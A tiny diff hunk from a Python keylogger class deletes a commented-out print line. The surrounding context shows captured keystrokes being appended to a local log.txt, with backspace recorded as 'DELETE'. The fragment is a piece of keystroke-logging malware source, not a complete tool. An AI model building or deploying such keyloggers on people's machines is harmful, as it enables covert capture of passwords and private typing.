@@ -31,7 +31,6 @@ class Keylogger:
             # print(self.keys)
         with open('log.txt', 'a+') as file:
             k = str(key).replace("'", "")
-            # print(k)
 
             if k.find("backspace") > 0:
                 file.write('DELETE ')
